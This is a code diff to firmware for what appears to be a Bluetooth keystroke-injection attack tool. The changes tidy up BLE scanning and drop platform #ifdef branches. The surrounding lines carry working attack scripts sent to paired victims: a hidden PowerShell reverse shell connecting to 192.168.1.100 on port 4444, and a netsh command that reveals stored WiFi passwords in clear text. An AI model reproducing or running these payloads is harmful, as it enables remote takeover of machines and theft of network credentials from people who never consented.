@@ -3139,11 +3139,7 @@ String getScriptFromUser() {
                     if(scriptName == "Open Calculator") {
                         return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
                     } else if(scriptName == "Open CMD/Terminal") {
-                        #ifdef WINDOWS
                         return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
-                        #else
-                        return "GUI\nDELAY 500\nSTRING terminal\nDELAY 300\nENTER";
-                        #endif
                     } else if(scriptName == "WiFi Credentials") {
                         return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER";
                     } else if(scriptName == "Reverse Shell") {
@@ -3241,7 +3237,6 @@ String selectTargetFromScan(const char* title) {
         BLEStateManager::deinitBLE(true);
         return "";
     }
-    pBLEScan->setAdvertisedDeviceCallbacks(simpleScanCallback, true);
     pBLEScan->setActiveScan(true);
     pBLEScan->setInterval(97);
     pBLEScan->setWindow(67);
@@ -3250,8 +3245,8 @@ String selectTargetFromScan(const char* title) {
     tft.print("Scanning for devices (20s)...");
     tft.setCursor(20, 120);
     tft.print("Press ESC to cancel");
+    pBLEScan->start(20, &simpleScanCallback, false);
     unsigned long scanStart = millis();
-    pBLEScan->start(20, false);
     while(millis() - scanStart < 20000) {
         if(check(EscPress) || check(PrevPress)) {
             pBLEScan->stop();
@@ -4510,11 +4505,7 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
                     switch(selected) {
                         case 0: script = "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER"; break;
                         case 1: 
-                            #ifdef WINDOWS
                             script = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
-                            #else
-                            script = "GUI\nDELAY 500\nSTRING terminal\nDELAY 300\nENTER";
-                            #endif
                             break;
                         case 2: script = "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER"; break;
                         case 3: script = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER"; break;
